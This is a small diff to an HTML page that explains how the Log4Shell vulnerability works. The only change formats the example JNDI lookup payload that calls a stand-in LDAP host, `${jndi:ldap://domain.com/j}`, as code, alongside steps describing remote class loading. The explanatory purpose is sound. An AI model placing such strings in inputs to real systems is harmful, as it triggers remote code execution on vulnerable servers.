@@ -218,7 +218,7 @@
                     
                    <h2>2.<u>How it works ( Detection )</u></h2>
                      <p> 
-1. An attacker inserts the JNDI lookup/payload an anywhere of request that is likely to be logged. (for instance: `${jndi:ldap://domain.com/j}`)<br><br>
+1. An attacker inserts the JNDI lookup/payload an anywhere of request that is likely to be logged. (for instance: <code>${jndi:ldap://domain.com/j}</code>)<br><br>
 2. The payload is passed to log4j for logging.<br><br>
 3. Log4j interpolates the string and queries the malicious LDAP server.<br><br>
 4. The LDAP server responds with directory information that contains the malicious java class.<br><br>
